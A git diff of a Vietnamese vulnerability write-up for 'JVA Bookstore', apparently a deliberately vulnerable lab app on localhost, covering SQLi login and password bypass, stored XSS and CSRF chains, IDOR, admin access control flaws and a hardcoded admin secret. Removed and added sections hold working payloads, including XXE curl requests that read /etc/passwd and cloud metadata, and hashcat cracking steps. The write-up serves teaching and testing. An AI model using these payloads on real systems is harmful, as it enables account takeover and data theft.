@@ -1,115 +1,21 @@
-# Tổng Hợp Tất Cả Lỗ Hổng Bảo Mật — JVA Bookstore
+# Tổng Hợp Lỗ Hổng Theo Danh Sách Yêu Cầu — JVA Bookstore
 
 ## Mục lục
 
 | # | Lỗ hổng | Loại | Mức độ |
 |---|---------|------|--------|
-| 1 | [SQLi — Tìm kiếm sách](#1-sql-injection--tìm-kiếm-sách) | SQL Injection | Cao |
-| 2 | [SQLi — Quick Search](#2-sql-injection--quick-search) | SQL Injection | Cao |
-| 3 | [SQLi — Đăng nhập (Authentication Bypass)](#3-sql-injection--đăng-nhập-authentication-bypass) | SQL Injection | Nghiêm trọng |
-| 4 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#4-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
-| 5 | [Stored XSS — Đánh giá sách](#5-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
-| 6 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#6-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
-| 7 | [XXE — Import sách bằng XML](#7-xxe--import-sách-bằng-xml) | XXE | Nghiêm trọng |
-| 8 | [IDOR — Xem profile user bất kỳ](#8-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
-| 9 | [Sensitive Data Exposure — Lộ password hash toàn bộ user](#9-sensitive-data-exposure--lộ-password-hash-toàn-bộ-user) | Sensitive Data Exposure | Nghiêm trọng |
-| 10 | [Security Misconfiguration — Stack trace + Error message leak](#10-security-misconfiguration--stack-trace--error-message-leak) | Security Misconfiguration | Cao |
+| 1 | [SQLi — Đăng nhập (Authentication Bypass)](#1-sql-injection--đăng-nhập-authentication-bypass) | SQL Injection | Nghiêm trọng |
+| 2 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#2-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
+| 3 | [Stored XSS — Đánh giá sách](#3-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
+| 4 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#4-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
+| 5 | [IDOR — Xem profile user bất kỳ](#5-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
+| 6 | [Broken Access Control — User thường truy cập/chỉnh sửa API admin](#6-broken-access-control--user-thường-truy-cậpchỉnh-sửa-api-admin) | Broken Access Control | Nghiêm trọng |
+| 7 | [Hardcoded Admin Secret — Chiếm quyền admin support chat](#7-hardcoded-admin-secret--chiếm-quyền-admin-support-chat) | Broken Authentication / Sensitive Secret Exposure | Nghiêm trọng |
+| 8 | [BOLA / IDOR nhẹ — Xem coupon active của shop khác qua shopId](#8-bola--idor-nhẹ--xem-coupon-active-của-shop-khác-qua-shopid) | Broken Access Control | Trung bình |
 
 ---
 
-## 1. SQL Injection — Tìm kiếm sách
-
-### Thông tin lỗ hổng
-
-- **Loại:** SQL Injection
-- **File:** `src/main/java/dao/BookDAO.java` — dòng 120-122
-- **Endpoint:** `GET /api/books/search?q=<payload>`
-
-### Code lỗi
-
-```java
-String sql = "SELECT b.id, b.title, b.author, b.isbn, b.price, b.description, " +
-        "b.category, b.stock_quantity, b.image_url, b.created_at, b.updated_at, " +
-        "b.status, b.shop_id, b.shop_name, 0 AS total_sold, 0 AS average_rating, " +
-        "0 AS rating_count, 0 AS favorite_count " +
-        "FROM books b WHERE 1=1 AND (b.title = '" + keyword.trim() + "' " +
-        "OR b.author = '" + keyword.trim() + "' " +
-        "OR b.isbn = '" + keyword.trim() + "')";
-```
-
-**Nguyên nhân:** Dùng string concatenation (`+`) để ghép trực tiếp input người dùng (`keyword`) vào câu SQL, thay vì dùng `PreparedStatement` với tham số `?`.
-
-### Cách tấn công chi tiết
-
-**Bước 1:** Mở trình duyệt, truy cập trang chủ `https://localhost:8443`
-
-**Bước 2:** Vào ô tìm kiếm sách trên giao diện
-
-**Bước 3:** Nhập payload vào ô tìm kiếm:
-
-```
-' OR '1'='1' --
-```
-https://localhost:8443/api/books/search?q=a' OR '1'='1
-
-**Bước 4:** Nhấn Enter hoặc nút tìm kiếm
-
-**Kết quả:** Trả về **toàn bộ sách** trong database thay vì chỉ sách khớp từ khóa.
-
-**Giải thích:** Câu SQL sau khi ghép payload trở thành:
-```sql
-SELECT ... FROM books b WHERE 1=1
-AND (b.title = '' OR '1'='1' --' OR b.author = '...')
-```
-- `' OR '1'='1'` → điều kiện luôn đúng → trả về tất cả
-- `--` → comment phần SQL còn lại
-
----
-
-## 2. SQL Injection — Quick Search
-
-### Thông tin lỗ hổng
-
-- **Loại:** SQL Injection
-- **File:** `src/main/java/dao/BookDAO.java` — dòng 139-142
-- **Endpoint:** `GET /api/books/search?q=<payload>` (quick search)
-
-### Code lỗi
-
-```java
-String keyword_trimmed = keyword.trim();
-String sql = BASE_SELECT +
-        " WHERE b.status = 'active' AND (b.title ILIKE '%" + keyword_trimmed +
-        "%' OR b.author ILIKE '%" + keyword_trimmed +
-        "%' OR b.isbn ILIKE '%" + keyword_trimmed + "%') " +
-        "ORDER BY rating_count DESC, total_sold DESC, b.title ASC LIMIT " + limit;
-```
-
-**Nguyên nhân:** Tương tự lỗ hổng #1 — string concatenation. Thêm vào đó, biến `limit` cũng bị ghép trực tiếp.
-
-### Cách tấn công chi tiết
-
-**Bước 1:** Mở trình duyệt, truy cập trang chủ
-
-**Bước 2:** Gõ vào thanh tìm kiếm nhanh (autocomplete):
-
-```
-') OR ('1'='1
-```
-https://localhost:8443/api/books/search?q=') OR ('1'='1
-**Bước 3:** Quan sát dropdown kết quả
-
-**Kết quả:** Hiển thị toàn bộ sách đang active.
-
-**Giải thích:** Câu SQL sau khi ghép:
-```sql
-... WHERE b.status = 'active' AND (b.title ILIKE '%') OR ('1'='1%' ...)
-```
-Điều kiện `OR ('1'='1...')` luôn đúng.
-
----
-
-## 3. SQL Injection — Đăng nhập (Authentication Bypass)
+## 1. SQL Injection — Đăng nhập (Authentication Bypass)
 
 ### Thông tin lỗ hổng
 
@@ -181,7 +87,7 @@ Thay `'admin'` bằng `'seller'` để login quyền seller:
 
 ---
 
-## 4. SQL Injection — Đổi mật khẩu (Bypass currentPassword)
+## 2. SQL Injection — Đổi mật khẩu (Bypass currentPassword)
 
 ### Thông tin lỗ hổng
 
@@ -260,7 +166,7 @@ fetch('/api/profile/password', {
 
 ---
 
-## 5. Stored XSS — Đánh giá sách
+## 3. Stored XSS — Đánh giá sách
 
 ### Thông tin lỗ hổng
 
@@ -321,12 +227,12 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 
 → Token JWT và cookie nạn nhân bị gửi về server attacker.
 
-## 6. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản
+## 4. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản
 
 ### Thông tin lỗ hổng
 
 - **Loại:** CSRF (Cross-Site Request Forgery), kết hợp Stored XSS + SQLi
-- **File:** Kết hợp lỗ hổng #5 (SQLi đổi mật khẩu) + #6 (Stored XSS)
+- **File:** Kết hợp lỗ hổng #2 (SQLi đổi mật khẩu) + #3 (Stored XSS)
 - **Endpoint bị tấn công:** `POST /api/profile/password`
 
 ### Nguyên nhân
@@ -373,7 +279,7 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 1. `localStorage.getItem("auth_token")` → lấy JWT token nạn nhân (người đang xem)
 2. `atob("eyJ...")` → giải mã base64 → JSON body chứa SQLi payload
 3. `fetch("/api/profile/password", ...)` → gửi request đổi mật khẩu:
-   - `currentPassword: "' OR '1'='1'--"` → SQLi bypass (lỗ hổng #5)
+   - `currentPassword: "' OR '1'='1'--"` → SQLi bypass (lỗ hổng #2)
    - `newPassword: "hacked_csrf"`
    - `confirmPassword: "hacked_csrf"`
 4. Server nhận request → BCrypt check fail → fallback legacy SQL → SQLi bypass → **mật khẩu nạn nhân bị đổi thành `hacked_csrf`**
@@ -397,130 +303,7 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 
 ---
 
-## 7. XXE — Import sách bằng XML
-
-### Thông tin lỗ hổng
-
-- **Loại:** XXE (XML External Entity Injection)
-- **File:** `src/main/java/web/BooksApiServlet.java` — dòng 295-308
-- **Endpoint:** `POST /api/books/import` (Content-Type: application/xml)
-
-### Code lỗi
-
-```java
-private void handleXmlImport(HttpServletRequest req, HttpServletResponse resp)
-        throws IOException {
-    try {
-        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-        // KHÔNG disable external entities!
-        // Thiếu: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-        DocumentBuilder builder = factory.newDocumentBuilder();
-        Document doc = builder.parse(req.getInputStream());
-        // ...
-    }
-}
-```
-
-**Nguyên nhân:** `DocumentBuilderFactory` mặc định cho phép External Entity — attacker khai báo entity trỏ đến file hệ thống hoặc URL nội bộ.
-
-### Cách tấn công chi tiết
-
-#### Tấn công 1 — Đọc file hệ thống
-
-**Bước 1:** Mở terminal hoặc Postman
-
-**Bước 2:** Gửi request sau (dùng curl):
-
-**Trên Windows (đọc file win.ini):**
-```bash
-curl -k -X POST https://localhost:8443/api/books/import \
-  -H "Content-Type: application/xml" \
-  -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
-<!DOCTYPE books [
-  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">
-]>
-<books>
-  <book>
-    <title>&xxe;</title>
-    <author>test</author>
-  </book>
-</books>"
-```
-
-**Trên Linux (đọc /etc/passwd):**
-```bash
-curl -k -X POST https://localhost:8443/api/books/import \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE books [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<books>
-  <book>
-    <title>&xxe;</title>
-    <author>test</author>
-  </book>
-</books>'
-```
-
-**Kết quả:** Nội dung file `win.ini` hoặc `/etc/passwd` được đọc và xử lý bởi server. Nếu response chứa thông tin book title → nội dung file bị lộ trực tiếp.
-
-**Giải thích:**
-1. `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` → khai báo entity `xxe` trỏ đến file
-2. `<title>&xxe;</title>` → khi parser xử lý `&xxe;`, nó đọc nội dung file và thay thế vào
-3. Server xử lý title = nội dung file → trả về trong response
-
-#### Tấn công 2 — SSRF (Server-Side Request Forgery)
-
-```bash
-curl -k -X POST https://localhost:8443/api/books/import \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE books [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<books>
-  <book>
-    <title>&xxe;</title>
-    <author>test</author>
-  </book>
-</books>'
-```
-
-**Kết quả:** Server gửi request đến `169.254.169.254` (AWS metadata endpoint) → lộ credentials cloud instance.
-
-#### Tấn công 3 — Đọc source code ứng dụng
-
-```xml
-<!DOCTYPE books [
-  <!ENTITY xxe SYSTEM "file:///path/to/application/WEB-INF/web.xml">
-]>
-```
-
-→ Đọc được cấu hình web.xml, biết cấu trúc ứng dụng.
-
-#### Hoặc dùng JavaScript trong DevTools Console
-
-```javascript
-fetch('/api/books/import', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/xml'},
-    body: `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE books [
-  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
-]>
-<books>
-  <book>
-    <title>&xxe;</title>
-    <author>test</author>
-  </book>
-</books>`
-}).then(r => r.json()).then(console.log);
-```
-
----
-
-## 8. IDOR — Xem profile user bất kỳ
+## 5. IDOR — Xem profile user bất kỳ
 
 ### Thông tin lỗ hổng
 
@@ -543,22 +326,26 @@ private void getAnyUserProfile(HttpServletRequest request, HttpServletResponse r
 }
 ```
 
-**Nguyên nhân:** Endpoint nhận `userId` từ client mà **không kiểm tra** user hiện tại có quyền xem profile của user đó không.
+**Nguyên nhân:**
+- Endpoint nhận `userId` từ client mà **không kiểm tra** user hiện tại có quyền xem profile của user đó không
+- `JwtFilter` còn allow public `GET /api/profile/user-info` nên endpoint này **thậm chí không bắt buộc đăng nhập**
+
+### Vì sao attacker biết endpoint này tồn tại?
+
+- Không nhất thiết phải thấy sẵn trong tab Network hoặc debugger của luồng UI
+- Attacker có thể phát hiện qua source code server (`ProfileServlet`) hoặc đoán theo pattern API `/api/profile/...`
+- Trong code hiện tại, `JwtFilter` còn whitelist trực tiếp path này ở nhánh public GET
 
 ### Cách tấn công chi tiết
 
-**Bước 1:** Đăng nhập bằng tài khoản customer bình thường
+**Bước 1:** Mở trực tiếp trình duyệt hoặc DevTools (F12) → Console
 
-**Bước 2:** Mở DevTools (F12) → Console
-
-**Bước 3:** Chạy lệnh lấy thông tin user id=1:
+**Bước 2:** Chạy lệnh lấy thông tin user id=1:
 
 ```javascript
-fetch('/api/profile/user-info?userId=1', {
-    headers: {
-        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
-    }
-}).then(r => r.json()).then(data => console.log(data));
+fetch('/api/profile/user-info?userId=1')
+  .then(r => r.json())
+  .then(data => console.log(data));
 ```
 
 **Kết quả:**
@@ -578,14 +365,12 @@ fetch('/api/profile/user-info?userId=1', {
 }
 ```
 
-**Bước 4:** Lặp lại với `userId=2`, `userId=3`, ... để thu thập thông tin **tất cả user**:
+**Bước 3:** Lặp lại với `userId=2`, `userId=3`, ... để thu thập thông tin **tất cả user**:
 
 ```javascript
-// Quét 100 user đầu tiên
-for (let i = 1; i <= 100; i++) {
-    fetch('/api/profile/user-info?userId=' + i, {
-        headers: {'Authorization': 'Bearer ' + localStorage.getItem('auth_token')}
-    })
+// Quét 1000 user đầu tiên
+for (let i = 1; i <= 1000; i++) {
+    fetch('/api/profile/user-info?userId=' + i)
     .then(r => r.json())
     .then(data => {
         if (data.success) {
@@ -601,204 +386,343 @@ hoặc vd: https://localhost:8443/api/profile/user-info?userId=199
 
 ---
 
-## 9. Sensitive Data Exposure — Lộ password hash toàn bộ user
+## 6. Broken Access Control — User thường truy cập/chỉnh sửa API admin
 
 ### Thông tin lỗ hổng
+Search từ khóa "categories" trong debugger trong DevTool(F12) -> lấy đc url "/api/admin/categories"
+của admin và tận dụng nó để tấn công.
 
-- **Loại:** Sensitive Data Exposure
-- **File:** `src/main/java/web/ProfileServlet.java` — dòng 377-417
-- **Endpoint:** `GET /api/profile/export`
+- **Loại:** Broken Access Control / Missing Authorization
+- **File 1:** `src/main/java/filters/JwtFilter.java` — dòng 121-138
+- **File 2:** `src/main/java/web/admin/AdminDashboardServlet.java` — dòng 25-49
+- **File 3:** `src/main/java/web/admin/AdminCategoriesServlet.java` — dòng 21-62
+- **Endpoint tiêu biểu:**
+  - `GET /api/admin/dashboard`
+  - `GET /api/admin/categories?action=list`
+  - `POST /api/admin/categories?action=create`
+  - `POST /api/admin/categories?action=update`
+  - `POST /api/admin/categories?action=delete`
 
 ### Code lỗi
 
 ```java
-private void exportAllUsersData(HttpServletRequest request, HttpServletResponse response)
-        throws IOException {
-    // KHÔNG kiểm tra quyền admin!
-    String sql = "SELECT id, email, full_name, phone, birth_date, address, " +
-                 "role, status, password_hash, created_at FROM users ORDER BY id";
-    // ...
-    user.put("passwordHash", rs.getString("password_hash")); // Trả về BCrypt hash!
+// JwtFilter.java
+if (path.equals("/api/admin/categories") || path.equals("/api/admin/dashboard") || path.equals("/api/admin/promotions")) {
+    return true;
+}
+```
+
+```java
+// JwtFilter.java
+HttpSession session = req.getSession(false);
+if (session != null && session.getAttribute("user_id") != null) {
+    chain.doFilter(request, response);
+    return;
+}
+```
+
+```java
+// AdminDashboardServlet.java
+protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+    JsonObject stats = getDashboardStats();
+    JsonObject revenueData = getRevenueData();
+    JsonObject topSellers = getTopSellers();
+    // KHÔNG kiểm tra role admin
+}
+```
+
+```java
+// AdminCategoriesServlet.java
+protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
+    if ("create".equals(action)) {
+        createCategory(req, out);
+    } else if ("update".equals(action)) {
+        updateCategory(req, out);
+    } else if ("delete".equals(action)) {
+        deleteCategory(req, out);
+    }
+    // KHÔNG kiểm tra role admin
 }
 ```
 
 **Nguyên nhân:**
-1. Endpoint không yêu cầu quyền admin — bất kỳ user đăng nhập nào cũng truy cập được
-2. Trả về cả trường `password_hash` — hash BCrypt của tất cả user
+1. `JwtFilter` cho phép public một số endpoint admin ở nhánh `GET`
+2. Với request không public, filter chỉ kiểm tra **đã đăng nhập** chứ không kiểm tra `role = admin`
+3. Bản thân các servlet admin không tự xác thực role admin
 
 ### Cách tấn công chi tiết
 
-**Bước 1:** Đăng nhập bằng bất kỳ tài khoản nào (kể cả customer)
+#### Tấn công 1 — Xem dashboard admin bằng tài khoản thường
+
+**Bước 1:** Đăng nhập bằng tài khoản customer bình thường
+
+**Bước 2:** Mở DevTools (F12) → Console hoặc truy cập trực tiếp:
+
+```
+https://localhost:8443/api/admin/dashboard
+```
+
+**Bước 3:** Hoặc gọi bằng `fetch()`:
+
+```javascript
+fetch('/api/admin/dashboard')
+  .then(r => r.json())
+  .then(console.log);
+```
+
+**Kết quả:** Trả về dữ liệu quản trị như:
+- `totalUsers`
+- `totalProducts`
+- `totalOrders`
+- `totalRevenue`
+- `topSellers`
+
+→ User thường đọc được dữ liệu chỉ dành cho admin.
+
+#### Tấn công 2 — Tạo category bằng tài khoản thường
+
+**Bước 1:** Đăng nhập bằng tài khoản customer bình thường
 
 **Bước 2:** Mở DevTools (F12) → Console
 
-**Bước 3:** Chạy:
+**Bước 3:** Gửi request tạo category:
 
 ```javascript
-fetch('/api/profile/export', {
-    headers: {
-        'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
-    }
-}).then(r => r.json()).then(data => {
-    console.log("Tổng số user:", data.total);
-    data.users.forEach(u => {
-        console.log(`${u.email} | ${u.role} | ${u.passwordHash}`);
-    });
-});
+fetch('/api/admin/categories?action=create', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: 'name=HackedCategory'
+}).then(r => r.text()).then(console.log);
 ```
 
-**Kết quả:**
-```
-Tổng số user: 50
-admin@bookstore.vn | admin | $2a$10$xKj5Ld9f8Gh...
-seller1@gmail.com | seller | $2a$10$mNp3Qr7t2Wx...
-customer1@gmail.com | customer | $2a$10$aB4cD5eF6g...
-...
+**Kết quả:** Nếu response trả về kiểu:
+
+```json
+{"message":"Category created successfully","id":123,...}
 ```
 
-**Bước 4 — Crack password bằng hashcat:**
+→ chứng minh user thường có thể thực hiện chức năng quản trị.
 
-```bash
-# Lưu hash vào file
-echo '$2a$10$xKj5Ld9f8Gh...' > hashes.txt
-echo '$2a$10$mNp3Qr7t2Wx...' >> hashes.txt
+#### Tấn công 3 — Sửa hoặc xóa category
 
-# Crack bằng hashcat (BCrypt mode = 3200)
-hashcat -m 3200 hashes.txt wordlist.txt
+```javascript
+fetch('/api/admin/categories?action=update', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'id=1&name=ChangedByCustomer'
+}).then(r => r.text()).then(console.log);
+
+fetch('/api/admin/categories?action=delete', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'id=1'
+}).then(r => r.text()).then(console.log);
 ```
 
-**Bước 5:** Password yếu (123456, password123, qwerty, ...) bị crack trong vài phút đến vài giờ.
+**Kết quả:** User thường có thể sửa/xóa dữ liệu quản trị nếu biết `id`.
 
-**Bước 6:** Attacker login vào tài khoản admin/seller/bất kỳ ai có password yếu.
-
-### Hoặc gõ trực tiếp trên URL
-
-```
-https://localhost:8443/api/profile/export
-```
-
-(Nếu đang đăng nhập và cookie `auth_token` có sẵn → trả về JSON chứa toàn bộ data)
+**Mức độ ảnh hưởng:**
+- Lộ dữ liệu quản trị nội bộ
+- User thường thao tác được chức năng admin
+- Có thể phá dữ liệu danh mục, ảnh hưởng toàn bộ hệ thống
 
 ---
 
-## 10. Security Misconfiguration — Stack Trace + Error Message Leak
+## 7. Hardcoded Admin Secret — Chiếm quyền admin support chat
 
 ### Thông tin lỗ hổng
 
-- **Loại:** Security Misconfiguration
-- **File 1:** `src/main/webapp/error.jsp` — dòng 15-21
-- **File 2:** `src/main/java/web/AuthServlet.java` — dòng 65, 93, 216
+- **Loại:** Broken Authentication / Sensitive Secret Exposure
+- **File 1:** `src/main/java/web/AdminSupportChatServlet.java` — dòng 195-227
+- **File 2:** `src/main/webapp/assets/js/admin/AdSupportChat.js` — dòng 7-13
+- **Endpoint:** `GET/POST /api/admin/support-chat`
 
 ### Code lỗi
 
-**error.jsp (stack trace leak):**
-```jsp
-<p>Message: <%= exception != null ? exception.getMessage() :
-    request.getAttribute("javax.servlet.error.message") %></p>
-<pre>
-<%
-    if (exception != null) {
-        exception.printStackTrace(new java.io.PrintWriter(out));
-    }
-%>
-</pre>
-```
-
-**AuthServlet.java (error message leak):**
 ```java
-// Dòng 65:
-out.write("{\"error\":\"" + e.getMessage() + "\"}");
+// AdminSupportChatServlet.java
+private boolean isAuthorized(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+    if (isLocalhost(req)) {
+        return true;
+    }
+    String expected = getAdminSecret();
+    String paramSecret = trimToNull(req.getParameter("secret"));
+    String headerSecret = trimToNull(req.getHeader("X-Admin-Secret"));
+    if (expected.equals(paramSecret) || expected.equals(headerSecret)) {
+        return true;
+    }
+    // ...
+}
 
-// Dòng 93:
-out.write("{\"error\":\"" + e.getMessage() + "\"}");
-
-// Dòng 216:
-out.write("{\"error\":\"Login error: " + e.getMessage() + "\"}");
-```
-
-**Nguyên nhân:**
-1. `error.jsp` in toàn bộ Java stack trace ra trình duyệt
-2. AuthServlet trả về `e.getMessage()` — chứa chi tiết lỗi SQL, tên bảng, cấu trúc query
-
-### Cách tấn công chi tiết
-
-#### Tấn công 1 — Khai thác Error Message Leak
-
-**Bước 1:** Mở DevTools (F12) → Console
-
-**Bước 2:** Gửi request gây lỗi SQL:
-
-```javascript
-fetch("/api/login?email='")
-  .then(r => r.json())
-  .then(data => console.log(data));
-```
-
-**Kết quả:** Server trả về chi tiết lỗi PostgreSQL:
-```json
-{
-  "error": "ERROR: unterminated quoted string at or near \"'\" Position: 58"
+private String getAdminSecret() {
+    String env = System.getenv("ADMIN_PANEL_SECRET");
+    if (env != null && !env.trim().isEmpty()) {
+        return env.trim();
+    }
+    return "dev-secret-key-change-me";
 }
 ```
 
-**Bước 3:** Thử tiếp để xác định số cột:
+```javascript
+// AdSupportChat.js
+var ADMIN_SECRET = (function () {
+    var params = new URLSearchParams(window.location.search);
+    var fromQuery = params.get('secret');
+    if (fromQuery && fromQuery.trim().length > 0) {
+        return fromQuery.trim();
+    }
+    return 'dev-secret-key-change-me';
+})();
+```
+
+**Nguyên nhân:**
+1. Quyền truy cập admin support chat không gắn với session/role admin thật
+2. Secret mặc định được hardcode trực tiếp trong backend
+3. Secret còn bị lộ luôn ở frontend JavaScript
+4. Ai biết secret đều có thể đọc toàn bộ conversation và trả lời như admin support
+
+### Cách test chi tiết
+
+#### Bước 1: Tạo một conversation để test
+Bắt đc gói tin support-chat ghi nhấn Hỗ trợ trên acc client, từ đó vô Debugger tìm thử từ khóa "support-chat" và thấy đc đường dẫn "/api/admin/support-chat" của admin, và ta sẽ tận dụng nó để giả mạo làm admin,...
+
+Đăng nhập bằng user thường, mở trang support và gửi 1 tin nhắn. Hoặc dùng Console:
 
 ```javascript
-// Thử UNION SELECT với số cột khác nhau
-fetch("/api/login?email=' UNION SELECT 1--")
-  .then(r => r.json()).then(console.log);
-// → Lỗi: "each UNION query must have the same number of result columns"
-
-fetch("/api/login?email=' UNION SELECT 1,2,3,4,5--")
-  .then(r => r.json()).then(console.log);
-// → Thành công → biết bảng có 5 cột: id, email, full_name, role, status
+fetch('/api/support-chat', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer ' + localStorage.getItem('auth_token'),
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    content: 'Test support chat from customer account'
+  })
+}).then(r => r.text()).then(console.log);
 ```
 
-**Thông tin attacker thu được:**
-- Database type: PostgreSQL
-- Tên bảng: `users`
-- Số cột và tên cột
-- Cấu trúc SQL query gốc
-- Phiên bản database
+#### Bước 2: Lấy danh sách conversation với secret mặc định
 
-→ Attacker dùng thông tin này để craft payload SQLi chính xác (lỗ hổng #1-#5).
-
-#### Tấn công 2 — Khai thác Stack Trace Leak
-
-**Bước 1:** Gây lỗi server nghiêm trọng (ví dụ gửi request đến endpoint bị lỗi)
-
-**Bước 2:** Server redirect đến `error.jsp`
-
-**Kết quả:** Trang hiển thị full Java stack trace:
-```
-java.sql.SQLException: ERROR: relation "users" does not exist
-    at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(...)
-    at web.AuthServlet.handleLogin(AuthServlet.java:123)
-    at web.AuthServlet.doPost(AuthServlet.java:78)
-    at javax.servlet.http.HttpServlet.service(HttpServlet.java:681)
-    ...
+```javascript
+fetch('/api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me')
+  .then(r => r.text())
+  .then(console.log);
 ```
 
-**Thông tin attacker thu được:**
-- Package structure: `web.AuthServlet`, `dao.BookDAO`
-- Java version
-- Database driver: `org.postgresql`
-- File path trên server
-- Tên method và dòng code
+**Kết quả mong đợi:** Response trả về danh sách `conversations`.
+
+#### Bước 3: Đọc message của một conversation cụ thể
+
+```javascript
+fetch('/api/admin/support-chat?action=messages&conversationId=1&secret=dev-secret-key-change-me')
+  .then(r => r.text())
+  .then(console.log);
+```
+
+**Kết quả mong đợi:** Trả về nội dung chat giữa user và support.
+
+#### Bước 4: Giả làm admin support để trả lời
+
+```javascript
+fetch('/api/admin/support-chat?secret=dev-secret-key-change-me', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    action: 'reply',
+    conversationId: 1,
+    content: 'Tin nhắn giả mạo từ admin support'
+  })
+}).then(r => r.text()).then(console.log);
+```
+
+**Kết quả mong đợi:** User quay lại trang support sẽ thấy tin nhắn mới từ phía support/admin.
+
+**Mức độ ảnh hưởng:**
+- Đọc toàn bộ hội thoại hỗ trợ
+- Giả mạo admin/support để lừa user
+- Rò rỉ secret nội bộ ra frontend
 
 ---
 
-## Tóm tắt toàn bộ
+## 8. BOLA / IDOR nhẹ — Xem coupon active của shop khác qua shopId
+
+### Thông tin lỗ hổng
+
+- **Loại:** Broken Object Level Authorization (BOLA) / IDOR nhẹ
+- **File 1:** `src/main/java/web/ProfileServlet.java` — dòng 959-977
+- **File 2:** `src/main/java/dao/ShopCouponDAO.java` — dòng 68-79
+- **Endpoint:** `GET /api/profile/shop-coupons?shopId=<id>`
+
+### Code lỗi
+
+```java
+private void listShopCouponsForShop(HttpServletRequest request, HttpServletResponse response)
+        throws IOException, SQLException {
+    Long userId = getRequiredUserId(request, response, responseMap);
+    // ...
+    Long shopIdRaw = parseId(request.getParameter("shopId"));
+    int shopId = shopIdRaw.intValue();
+    List<ShopCoupon> coupons = ShopCouponDAO.listActiveForShop(shopId);
+}
+```
+
+```java
+public static List<ShopCoupon> listActiveForShop(int shopId) throws SQLException {
+    String sql = "SELECT ... FROM shop_coupons ... WHERE sc.shop_id = ? AND sc.status = 'active' ...";
+}
+```
+
+**Nguyên nhân:**
+1. Endpoint nhận `shopId` trực tiếp từ client
+2. Không kiểm tra user hiện tại có quyền xem coupon của shop đó hay không
+3. Bất kỳ user đăng nhập nào cũng có thể đổi `shopId` để xem dữ liệu shop khác
+
+### Cách test chi tiết
+
+#### Bước 1: Đăng nhập bằng user thường
+
+#### Bước 2: Gọi endpoint với `shopId` khác nhau
+
+```javascript
+fetch('/api/profile/shop-coupons?shopId=1', {
+  headers: {
+    'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
+  }
+}).then(r => r.text()).then(console.log);
+```
+
+Sau đó đổi `shopId=2`, `3`, `4`...
+
+**Kết quả mong đợi:** Response trả về coupon active của từng shop khác nhau dù user không thuộc shop đó.
+
+**Thông tin bị lộ:**
+- `code`
+- `description`
+- `discountType`
+- `discountValue`
+- `minimumOrder`
+- `remaining`
+- `startDate`, `endDate`
+- `shopName`
+
+**Mức độ ảnh hưởng:**
+- Rò rỉ dữ liệu khuyến mãi giữa các shop
+- Cho phép user enumerate coupon active theo `shopId`
+- Yếu hơn `user-info`, nhưng vẫn là một object-level authorization issue rõ ràng
+
+---
+
+## Tóm tắt các lỗ hổng giữ lại
 
 | # | Lỗ hổng | Loại | Endpoint | Payload chính |
 |---|---------|------|----------|---------------|
-| 1 | SQLi tìm sách | SQLi | `GET /api/books/search?q=` | `' OR '1'='1' --` |
-| 2 | SQLi quick search | SQLi | `GET /api/books/search?q=` | `') OR ('1'='1` |
-| 3 | SQLi login bypass | SQLi | `POST /api/login` | `' UNION SELECT 1,'admin','a@b.c','','admin','active' --` |
-| 4 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
-| 5 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
-| 6 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
-| 7 | XXE | XXE | `POST /api/books/import` | `<!ENTITY xxe SYSTEM "file:///...">` |
-| 8 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
-| 9 | Data Exposure | Sensitive Data | `GET /api/profile/export` | Trả về password hash |
